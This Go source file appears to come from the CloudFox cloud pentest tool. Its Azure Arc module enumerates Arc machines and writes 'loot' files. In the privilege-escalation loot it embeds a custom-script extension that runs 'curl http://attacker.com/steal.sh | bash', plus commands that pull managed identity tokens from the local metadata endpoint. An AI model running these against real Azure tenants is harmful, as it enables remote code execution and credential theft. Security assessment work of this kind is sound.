package commands

import (
	"context"
	"fmt"
	"sync"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	azinternal "github.com/BishopFox/cloudfox/internal/azure"
	"github.com/spf13/cobra"
)

// ------------------------------
// Cobra command
// ------------------------------
var AzArcCommand = &cobra.Command{
	Use:     "arc",
	Aliases: []string{"hybrid"},
	Short:   "Enumerate Azure Arc-enabled resources with comprehensive hybrid security analysis",
	Long: `
Enumerate Azure Arc-enabled resources for a specific tenant:
  ./cloudfox az arc --tenant TENANT_ID

Enumerate Azure Arc-enabled resources for a specific subscription:
  ./cloudfox az arc --subscription SUBSCRIPTION_ID

ENHANCED FEATURES:
  - Arc-enabled servers with managed identity analysis
  - Arc-enabled Kubernetes clusters
  - Arc data services (SQL Server, PostgreSQL)
  - Connected machine extensions and agents
  - Hybrid connectivity security assessment
  - Certificate and credential analysis
  - Extension-based privilege escalation paths

SECURITY ANALYSIS:
  - Managed identity token theft opportunities
  - Extension privilege escalation vectors
  - Unmanaged/orphaned Arc resources
  - Agent version vulnerabilities
  - Hybrid network exposure`,
	Run: ListArc,
}

// ------------------------------
// Module struct (AWS pattern)
// ------------------------------
type ArcModule struct {
	azinternal.BaseAzureModule // Embed common fields

	// Module-specific fields
	Subscriptions []string
	ArcRows       [][]string
	LootMap       map[string]*internal.LootFile
	mu            sync.Mutex
}

// ------------------------------
// Output struct
// ------------------------------
type ArcOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o ArcOutput) TableFiles() []internal.TableFile { return o.Table }
func (o ArcOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Cobra command entry point (thin wrapper)
// ------------------------------
func ListArc(cmd *cobra.Command, args []string) {
	// -------------------- Use InitializeCommandContext helper --------------------
	cmdCtx, err := azinternal.InitializeCommandContext(cmd, globals.AZ_ARC_MODULE_NAME)
	if err != nil {
		return // error already logged by helper
	}
	defer cmdCtx.Session.StopMonitoring()

	// -------------------- Initialize module --------------------
	module := &ArcModule{
		BaseAzureModule: azinternal.NewBaseAzureModule(cmdCtx, 5),
		Subscriptions:   cmdCtx.Subscriptions,
		ArcRows:         [][]string{},
		LootMap: map[string]*internal.LootFile{
			"arc-commands":             {Name: "arc-commands", Contents: ""},
			"arc-machines":             {Name: "arc-machines", Contents: ""},
			"arc-identities":           {Name: "arc-identities", Contents: ""},
			"arc-cert-extraction":      {Name: "arc-cert-extraction", Contents: ""},
			"arc-kubernetes":           {Name: "arc-kubernetes", Contents: "# Arc-enabled Kubernetes Clusters\n\n"},
			"arc-data-services":        {Name: "arc-data-services", Contents: "# Arc-enabled Data Services\n\n"},
			"arc-extensions":           {Name: "arc-extensions", Contents: "# Connected Machine Extensions\n\n"},
			"arc-security-analysis":    {Name: "arc-security-analysis", Contents: "# Arc Security Analysis\n\n"},
			"arc-privilege-escalation": {Name: "arc-privilege-escalation", Contents: "# Arc Extension Privilege Escalation Paths\n\n"},
			"arc-hybrid-connectivity":  {Name: "arc-hybrid-connectivity", Contents: "# Hybrid Connectivity Analysis\n\n"},
		},
	}

	// -------------------- Execute module --------------------
	module.PrintArc(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Main module method (AWS-style)
// ------------------------------
func (m *ArcModule) PrintArc(ctx context.Context, logger internal.Logger) {
	// Multi-tenant processing
	if m.IsMultiTenant {
		logger.InfoM(fmt.Sprintf("Multi-tenant mode: Processing %d tenants", len(m.Tenants)), globals.AZ_ARC_MODULE_NAME)

		// Process each tenant independently
		for _, tenantCtx := range m.Tenants {
			// Temporarily set module tenant context for row creation
			savedTenantID := m.TenantID
			savedTenantName := m.TenantName
			savedTenantInfo := m.TenantInfo

			m.TenantID = tenantCtx.TenantID
			m.TenantName = tenantCtx.TenantName
			m.TenantInfo = tenantCtx.TenantInfo

			if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Processing tenant: %s (%s)", m.TenantName, m.TenantID), globals.AZ_ARC_MODULE_NAME)
			}

			// Process subscriptions for this tenant
			m.RunSubscriptionEnumeration(ctx, logger, tenantCtx.Subscriptions, globals.AZ_ARC_MODULE_NAME, m.processSubscription)

			// Restore tenant context
			m.TenantID = savedTenantID
			m.TenantName = savedTenantName
			m.TenantInfo = savedTenantInfo
		}
	} else {
		// Single tenant processing (existing logic)
		logger.InfoM(fmt.Sprintf("Enumerating arc-enabled machines for %d subscription(s)", len(m.Subscriptions)), globals.AZ_ARC_MODULE_NAME)
		m.RunSubscriptionEnumeration(ctx, logger, m.Subscriptions, globals.AZ_ARC_MODULE_NAME, m.processSubscription)
	}

	// Generate and write output
	m.writeOutput(ctx, logger)
}

// ------------------------------
// Process single subscription
// ------------------------------
func (m *ArcModule) processSubscription(ctx context.Context, subID string, logger internal.Logger) {
	// Get subscription name
	subName := azinternal.GetSubscriptionNameFromID(ctx, m.Session, subID)

	// Get resource groups (CACHED)
	resourceGroups := m.ResolveResourceGroups(subID)

	// Get all Arc machines
	arcMachines, err := azinternal.GetArcMachines(m.Session, subID, resourceGroups)
	if err != nil {
		if globals.AZ_VERBOSITY >= globals.AZ_VERBOSE_ERRORS {
			logger.ErrorM(fmt.Sprintf("Failed to get Arc machines for subscription %s: %v", subID, err), globals.AZ_ARC_MODULE_NAME)
		}
		m.CommandCounter.Error++
		return
	}

	// Process each Arc machine
	for _, machine := range arcMachines {
		m.processArcMachine(ctx, subID, subName, machine)
	}
}

// ------------------------------
// Process single Arc machine
// ------------------------------
func (m *ArcModule) processArcMachine(ctx context.Context, subID, subName string, machine azinternal.ArcMachine) {
	// Thread-safe append
	m.mu.Lock()
	defer m.mu.Unlock()

	// Parse identity type to separate system-assigned and user-assigned
	systemAssignedID := "N/A"
	userAssignedID := "N/A"

	if machine.IdentityType != "" && machine.IdentityType != "None" {
		idType := machine.IdentityType
		// Check for system-assigned identity
		if idType == "SystemAssigned" || idType == "SystemAssigned,UserAssigned" || idType == "SystemAssigned, UserAssigned" {
			if machine.PrincipalID != "" {
				systemAssignedID = machine.PrincipalID
			}
		}
		// Check for user-assigned identity
		if idType == "UserAssigned" || idType == "SystemAssigned,UserAssigned" || idType == "SystemAssigned, UserAssigned" {
			// Arc SDK doesn't expose user-assigned identity resource IDs like VMs do
			userAssignedID = "User-Assigned (ID not available via SDK)"
		}
	}

	m.ArcRows = append(m.ArcRows, []string{
		m.TenantName,
		m.TenantID,
		subID,
		subName,
		machine.ResourceGroup,
		machine.Location,
		machine.Name,
		machine.Hostname,
		machine.PrivateIP,
		machine.OSName,
		machine.OSVersion,
		machine.Status,
		machine.AgentVersion,
		machine.EntraIDAuth,
		systemAssignedID,
		userAssignedID,
	})

	// Generate loot
	m.generateLoot(subID, subName, machine)
}

// ------------------------------
// Generate loot files
// ------------------------------
func (m *ArcModule) generateLoot(subID, subName string, machine azinternal.ArcMachine) {
	// Commands loot
	if lf, ok := m.LootMap["arc-commands"]; ok {
		lf.Contents += fmt.Sprintf("## Arc Machine: %s (Resource Group: %s)\n", machine.Name, machine.ResourceGroup)
		lf.Contents += fmt.Sprintf("az account set --subscription %s\n", subID)
		lf.Contents += fmt.Sprintf("# List Arc machines\n")
		lf.Contents += fmt.Sprintf("az connectedmachine list --resource-group %s -o table\n\n", machine.ResourceGroup)
		lf.Contents += fmt.Sprintf("# Show Arc machine details\n")
		lf.Contents += fmt.Sprintf("az connectedmachine show --name %s --resource-group %s\n\n", machine.Name, machine.ResourceGroup)
		lf.Contents += fmt.Sprintf("# List Arc machine extensions\n")
		lf.Contents += fmt.Sprintf("az connectedmachine extension list --machine-name %s --resource-group %s -o table\n\n", machine.Name, machine.ResourceGroup)
	}

	// Machines loot
	if lf, ok := m.LootMap["arc-machines"]; ok {
		lf.Contents += fmt.Sprintf("\n## Arc Machine: %s\n", machine.Name)
		lf.Contents += fmt.Sprintf("# Resource Group: %s, Subscription: %s (%s)\n", machine.ResourceGroup, subName, subID)
		lf.Contents += fmt.Sprintf("- **Location**: %s\n", machine.Location)
		lf.Contents += fmt.Sprintf("- **Hostname**: %s\n", machine.Hostname)
		lf.Contents += fmt.Sprintf("- **Private IP**: %s\n", machine.PrivateIP)
		lf.Contents += fmt.Sprintf("- **OS**: %s (%s)\n", machine.OSName, machine.OSVersion)
		lf.Contents += fmt.Sprintf("- **Status**: %s\n", machine.Status)
		lf.Contents += fmt.Sprintf("- **Provisioning State**: %s\n", machine.ProvisioningState)
		lf.Contents += fmt.Sprintf("- **Agent Version**: %s\n", machine.AgentVersion)
		lf.Contents += fmt.Sprintf("- **VM ID**: %s\n", machine.VMId)
		if machine.LastStatusChange != "" {
			lf.Contents += fmt.Sprintf("- **Last Status Change**: %s\n", machine.LastStatusChange)
		}
		lf.Contents += "\n"
	}

	// Identities loot
	if lf, ok := m.LootMap["arc-identities"]; ok {
		if machine.IdentityType != "" && machine.IdentityType != "None" {
			lf.Contents += fmt.Sprintf("\n## Arc Machine: %s\n", machine.Name)
			lf.Contents += fmt.Sprintf("# Resource Group: %s, Subscription: %s (%s)\n", machine.ResourceGroup, subName, subID)
			lf.Contents += fmt.Sprintf("- **Identity Type**: %s\n", machine.IdentityType)
			lf.Contents += fmt.Sprintf("- **Principal ID**: %s\n", machine.PrincipalID)
			lf.Contents += fmt.Sprintf("- **Tenant ID**: %s\n", machine.TenantID)
			lf.Contents += fmt.Sprintf("- **OS**: %s\n", machine.OSName)

			if machine.OSName == "windows" {
				lf.Contents += fmt.Sprintf("- **Certificate Path**: C:\\ProgramData\\AzureConnectedMachineAgent\\Certs\\myCert.cer\n")
			} else {
				lf.Contents += fmt.Sprintf("- **Certificate Path**: /var/opt/azcmagent/certs/myCert\n")
			}
			lf.Contents += "\n"
		}
	}

	// Generate extraction template if machine has managed identity
	if machine.IdentityType != "" && machine.IdentityType != "None" {
		if lf, ok := m.LootMap["arc-cert-extraction"]; ok {
			template := azinternal.GenerateArcCertExtractionTemplate(machine)
			lf.Contents += template
			lf.Contents += "---\n\n"
		}
	}

	// Add Kubernetes cluster documentation
	if lf, ok := m.LootMap["arc-kubernetes"]; ok {
		lf.Contents += fmt.Sprintf(
			"## Arc-enabled Kubernetes in Subscription: %s\n\n"+
				"# List Arc-enabled Kubernetes clusters\n"+
				"az connectedk8s list --subscription %s --output table\n\n"+
				"# Show cluster details\n"+
				"az connectedk8s show --name <CLUSTER_NAME> --resource-group %s\n\n"+
				"# List cluster extensions\n"+
				"az k8s-extension list --cluster-name <CLUSTER_NAME> --cluster-type connectedClusters --resource-group %s\n\n"+
				"# Get kubeconfig for Arc-enabled cluster (if authorized)\n"+
				"az connectedk8s proxy --name <CLUSTER_NAME> --resource-group %s\n\n"+
				"### Security Analysis:\n"+
				"# Check for:\n"+
				"# 1. Azure Monitor extension (potential log exfiltration)\n"+
				"# 2. Azure Policy extension (compliance enforcement)\n"+
				"# 3. GitOps extension (deployment automation - potential backdoor)\n"+
				"# 4. Azure Key Vault Secrets Provider (credential access)\n"+
				"# 5. Defender for Kubernetes (security monitoring)\n\n",
			subName, subID, machine.ResourceGroup, machine.ResourceGroup, machine.ResourceGroup,
		)
	}

	// Add data services documentation
	if lf, ok := m.LootMap["arc-data-services"]; ok {
		lf.Contents += fmt.Sprintf(
			"## Arc Data Services in Subscription: %s\n\n"+
				"### Arc-enabled SQL Server\n"+
				"# List Arc-enabled SQL Servers\n"+
				"az sql server-arc list --subscription %s --output table\n\n"+
				"# Show SQL Server details\n"+
				"az sql server-arc show --name <SERVER_NAME> --resource-group %s\n\n"+
				"# List databases on Arc-enabled SQL Server\n"+
				"az sql db-arc list --server <SERVER_NAME> --resource-group %s\n\n"+
				"### Arc-enabled PostgreSQL\n"+
				"# List Arc-enabled PostgreSQL servers\n"+
				"az postgres server-arc list --subscription %s --output table\n\n"+
				"# Show PostgreSQL server details\n"+
				"az postgres server-arc show --name <SERVER_NAME> --resource-group %s\n\n"+
				"### Security Concerns:\n"+
				"# 1. On-premises database credentials accessible via Arc\n"+
				"# 2. Data exfiltration through Arc connectivity\n"+
				"# 3. Database backup access\n"+
				"# 4. Connection string exposure\n\n",
			subName, subID, machine.ResourceGroup, machine.ResourceGroup, subID, machine.ResourceGroup,
		)
	}

	// Add extensions analysis
	if lf, ok := m.LootMap["arc-extensions"]; ok {
		lf.Contents += fmt.Sprintf(
			"## Machine Extensions: %s (Resource Group: %s)\n\n"+
				"# List all extensions on Arc machine\n"+
				"az connectedmachine extension list --machine-name %s --resource-group %s --output table\n\n"+
				"# Show specific extension\n"+
				"az connectedmachine extension show --machine-name %s --resource-group %s --name <EXTENSION_NAME>\n\n"+
				"### Common Extensions and Security Impact:\n\n"+
				"1. **CustomScriptExtension**\n"+
				"   - Risk: HIGH\n"+
				"   - Allows arbitrary script execution on machine\n"+
				"   - Check for malicious scripts or backdoors\n"+
				"   - Command: az connectedmachine extension show --machine-name %s --resource-group %s --name CustomScriptExtension\n\n"+
				"2. **AzureMonitorLinuxAgent / AzureMonitorWindowsAgent**\n"+
				"   - Risk: MEDIUM\n"+
				"   - Collects logs and metrics\n"+
				"   - Potential data exfiltration vector\n"+
				"   - Check Log Analytics workspace configuration\n\n"+
				"3. **KeyVaultForLinux / KeyVaultForWindows**\n"+
				"   - Risk: HIGH\n"+
				"   - Syncs certificates/secrets from Key Vault to machine\n"+
				"   - Check which Key Vault is referenced\n"+
				"   - Potential credential theft if machine is compromised\n\n"+
				"4. **DependencyAgentLinux / DependencyAgentWindows**\n"+
				"   - Risk: MEDIUM\n"+
				"   - Maps network connections and dependencies\n"+
				"   - Useful for lateral movement analysis\n\n"+
				"5. **AzureSecurityLinuxAgent / AzureSecurityWindowsAgent**\n"+
				"   - Risk: LOW (defensive)\n"+
				"   - Microsoft Defender for Cloud integration\n"+
				"   - Security monitoring and assessment\n\n",
			machine.Name, machine.ResourceGroup,
			machine.Name, machine.ResourceGroup,
			machine.Name, machine.ResourceGroup,
			machine.Name, machine.ResourceGroup,
		)
	}

	// Add security analysis
	if lf, ok := m.LootMap["arc-security-analysis"]; ok {
		risk := "INFO"
		if machine.Status != "Connected" {
			risk = "MEDIUM"
		}
		if machine.IdentityType != "" && machine.IdentityType != "None" {
			risk = "HIGH"
		}

		lf.Contents += fmt.Sprintf(
			"## Security Analysis: %s\n\n"+
				"**Risk Level**: %s\n"+
				"**Machine**: %s (%s)\n"+
				"**Resource Group**: %s\n"+
				"**Subscription**: %s (%s)\n\n"+
				"### Configuration:\n"+
				"- **Status**: %s\n"+
				"- **Managed Identity**: %s\n"+
				"- **Entra ID Auth**: %s\n"+
				"- **Agent Version**: %s\n"+
				"- **OS**: %s %s\n\n"+
				"### Security Risks:\n\n",
			machine.Name,
			risk,
			machine.Name, machine.Hostname,
			machine.ResourceGroup,
			subName, subID,
			machine.Status,
			machine.IdentityType,
			machine.EntraIDAuth,
			machine.AgentVersion,
			machine.OSName, machine.OSVersion,
		)

		if machine.Status != "Connected" {
			lf.Contents += fmt.Sprintf("1. **MEDIUM RISK**: Machine status is '%s' (not Connected)\n"+
				"   - Orphaned Arc resource\n"+
				"   - May indicate deleted/decommissioned machine still registered\n"+
				"   - Cleanup recommended: az connectedmachine delete --name %s --resource-group %s\n\n",
				machine.Status, machine.Name, machine.ResourceGroup)
		}

		if machine.IdentityType != "" && machine.IdentityType != "None" {
			lf.Contents += fmt.Sprintf("2. **HIGH RISK**: Machine has managed identity (%s)\n"+
				"   - Principal ID: %s\n"+
				"   - Token theft opportunity if machine is compromised\n"+
				"   - Check RBAC assignments: az role assignment list --assignee %s\n"+
				"   - Certificate extraction possible (see arc-cert-extraction loot file)\n\n",
				machine.IdentityType, machine.PrincipalID, machine.PrincipalID)
		}

		if machine.EntraIDAuth == "Disabled" {
			lf.Contents += "3. **MEDIUM RISK**: Entra ID authentication is disabled\n" +
				"   - Machine uses local authentication\n" +
				"   - Centralized identity management not enforced\n" +
				"   - Enable with: az connectedmachine update --enable-azure-ad-auth --name " + machine.Name + " --resource-group " + machine.ResourceGroup + "\n\n"
		}

		lf.Contents += "\n"
	}

	// Add privilege escalation paths
	if machine.IdentityType != "" && machine.IdentityType != "None" {
		if lf, ok := m.LootMap["arc-privilege-escalation"]; ok {
			lf.Contents += fmt.Sprintf(
				"## Privilege Escalation: %s\n\n"+
					"**Machine**: %s\n"+
					"**Principal ID**: %s\n"+
					"**Resource Group**: %s\n\n"+
					"### Extension-Based Escalation Vectors:\n\n"+
					"1. **CustomScriptExtension Exploitation**\n"+
					"   - If you have Contributor on the Arc machine resource:\n"+
					"     ```bash\n"+
					"     # Deploy custom script extension\n"+
					"     az connectedmachine extension create \\\n"+
					"       --machine-name %s \\\n"+
					"       --resource-group %s \\\n"+
					"       --name MaliciousExtension \\\n"+
					"       --type CustomScriptExtension \\\n"+
					"       --publisher Microsoft.Azure.Extensions \\\n"+
					"       --settings '{\"commandToExecute\":\"curl http://attacker.com/steal.sh | bash\"}'\n"+
					"     ```\n\n"+
					"2. **Managed Identity Token Theft**\n"+
					"   - If you have access to the machine (RDP/SSH):\n"+
					"     ```bash\n"+
					"     # Linux: Extract managed identity token\n"+
					"     curl 'http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://management.azure.com/' \\\n"+
					"       -H Metadata:true\n\n"+
					"     # Windows: Extract managed identity token\n"+
					"     Invoke-WebRequest -Uri 'http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://management.azure.com/' \\\n"+
					"       -Headers @{Metadata='true'} -UseBasicParsing\n"+
					"     ```\n\n"+
					"3. **Certificate Extraction**\n"+
					"   - See arc-cert-extraction loot file for detailed steps\n"+
					"   - Certificates can be used to impersonate the Arc machine's identity\n\n"+
					"4. **Hybrid Runbook Worker Exploitation**\n"+
					"   - If machine is registered as Hybrid Runbook Worker:\n"+
					"     - Check: az automation hybrid-worker list --automation-account-name <ACCOUNT> --resource-group <RG>\n"+
					"     - Can execute arbitrary code through Automation runbooks\n"+
					"     - Runbooks execute with machine's identity/credentials\n\n"+
					"### Remediation:\n"+
					"- Review and restrict RBAC permissions on Arc machine resource\n"+
					"- Monitor extension deployments\n"+
					"- Enable Azure Policy to restrict extension types\n"+
					"- Use Azure Firewall to restrict Arc machine outbound connectivity\n"+
					"- Implement JIT access for machine management\n\n",
				machine.Name,
				machine.Name,
				machine.PrincipalID,
				machine.ResourceGroup,
				machine.Name,
				machine.ResourceGroup,
			)
		}
	}

	// Add hybrid connectivity analysis
	if lf, ok := m.LootMap["arc-hybrid-connectivity"]; ok {
		lf.Contents += fmt.Sprintf(
			"## Hybrid Connectivity: %s\n\n"+
				"**Machine**: %s (%s)\n"+
				"**Location**: %s\n"+
				"**Private IP**: %s\n"+
				"**OS**: %s\n\n"+
				"### Arc Connectivity Architecture:\n"+
				"1. **Outbound HTTPS** (TCP 443) to Azure Arc endpoints\n"+
				"   - Arc machine agent initiates connection to Azure\n"+
				"   - No inbound ports required\n"+
				"   - Uses certificate-based authentication\n\n"+
				"2. **Required Endpoints**:\n"+
				"   - management.azure.com (Azure Resource Manager)\n"+
				"   - login.microsoftonline.com (Azure AD authentication)\n"+
				"   - <region>.his.arc.azure.com (Hybrid Instance Metadata Service)\n"+
				"   - <region>.guestconfiguration.azure.com (Guest Configuration)\n"+
				"   - packages.microsoft.com (Package downloads)\n\n"+
				"3. **Network Security Considerations**:\n"+
				"   - Machine can access Azure management plane\n"+
				"   - Potential for data exfiltration to Azure\n"+
				"   - Command & Control channel via Arc agent\n"+
				"   - Monitor outbound connections for anomalies\n\n"+
				"### Attack Surface:\n"+
				"- **Arc Agent Compromise**: If agent is compromised, attacker gains Azure credentials\n"+
				"- **Man-in-the-Middle**: SSL inspection may expose Arc certificates\n"+
				"- **Network Pivoting**: Arc connectivity can be used to pivot from on-prem to Azure\n"+
				"- **Data Exfiltration**: Extensions can exfiltrate data to Azure Storage/Log Analytics\n\n"+
				"### Monitoring Recommendations:\n"+
				"```bash\n"+
				"# Check Arc machine activity logs\n"+
				"az monitor activity-log list \\\n"+
				"  --resource-id /subscriptions/%s/resourceGroups/%s/providers/Microsoft.HybridCompute/machines/%s \\\n"+
				"  --start-time $(date -u -d '7 days ago' +%%Y-%%m-%%dT%%H:%%M:%%SZ)\n\n"+
				"# Check for suspicious extension deployments\n"+
				"az monitor activity-log list \\\n"+
				"  --resource-group %s \\\n"+
				"  --caller <PRINCIPAL_ID> \\\n"+
				"  --start-time $(date -u -d '7 days ago' +%%Y-%%m-%%dT%%H:%%M:%%SZ) \\\n"+
				"  | jq '.[] | select(.operationName.value | contains(\"Microsoft.HybridCompute/machines/extensions/write\"))'\n"+
				"```\n\n",
			machine.Name,
			machine.Name, machine.Hostname,
			machine.Location,
			machine.PrivateIP,
			machine.OSName,
			subID, machine.ResourceGroup, machine.Name,
			machine.ResourceGroup,
		)
	}
}

// ------------------------------
// Write output (AWS-style writeLoot pattern)
// ------------------------------
func (m *ArcModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if len(m.ArcRows) == 0 {
		logger.InfoM("No Arc-enabled machines found", globals.AZ_ARC_MODULE_NAME)
		return
	}

	// Build headers
	headers := []string{
		"Tenant Name",
		"Tenant ID",
		"Subscription ID",
		"Subscription Name",
		"Resource Group",
		"Region",
		"Machine Name",
		"Hostname",
		"Private IP",
		"OS Name",
		"OS Version",
		"Status",
		"Agent Version",
		"EntraID Centralized Auth",
		"System Assigned Identity ID",
		"User Assigned Identity ID",
	}

	// Check if we should split output by tenant (multi-tenant takes precedence)
	if m.IsMultiTenant {
		if err := m.FilterAndWritePerTenantAuto(
			ctx, logger, m.Tenants, m.ArcRows, headers,
			"arc", globals.AZ_ARC_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Otherwise, check if we should split output by subscription
	if azinternal.ShouldSplitBySubscription(m.Subscriptions, m.TenantFlagPresent) {
		if err := m.FilterAndWritePerSubscriptionAuto(
			ctx, logger, m.Subscriptions, m.ArcRows, headers,
			"arc", globals.AZ_ARC_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Build loot array
	loot := []internal.LootFile{}
	for _, lf := range m.LootMap {
		if lf.Contents != "" {
			loot = append(loot, *lf)
		}
	}

	// Create output
	output := ArcOutput{
		Table: []internal.TableFile{{
			Name:   "arc",
			Header: headers,
			Body:   m.ArcRows,
		}},
		Loot: loot,
	}

	// Determine output scope (single subscription vs tenant-wide consolidation)
	scopeType, scopeIDs, scopeNames := azinternal.DetermineScopeForOutput(m.Subscriptions, m.TenantID, m.TenantName, m.TenantFlagPresent)
	scopeNames = azinternal.GetSubscriptionNamesForOutput(ctx, m.Session, scopeType, scopeIDs)

	// Write output using HandleOutputSmart (automatic streaming for large datasets)
	if err := internal.HandleOutputSmart(
		"Azure",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		scopeType,
		scopeIDs,
		scopeNames,
		m.UserUPN,
		output,
	); err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.AZ_ARC_MODULE_NAME)
		m.CommandCounter.Error++
	}

	logger.SuccessM(fmt.Sprintf("Found %d Arc-enabled machine(s) across %d subscription(s)", len(m.ArcRows), len(m.Subscriptions)), globals.AZ_ARC_MODULE_NAME)
}
